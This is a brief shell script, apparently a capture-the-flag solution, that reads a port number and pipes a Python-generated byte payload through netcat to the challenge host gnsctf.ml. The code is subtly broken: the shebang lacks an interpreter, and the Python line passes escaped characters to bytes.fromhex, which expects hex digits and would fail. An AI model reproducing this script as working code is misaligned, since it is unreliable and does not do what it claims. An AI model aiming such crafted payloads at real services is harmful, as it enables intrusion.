#!/usr/bin/env

echo -e "\e[31mRunning Script... \e[0m" ; echo ;

echo "Enter Port" ; read portNum ;

# bundle the commands
( python -c 'print(bytes.fromhex("\x45\x49\x04\x84\x05\x84\x23\x02\x99\x32").decode("latin-1"))*1' ) | nc gnsctf.ml $portNum

echo -e "End Script" ; echo ; exit
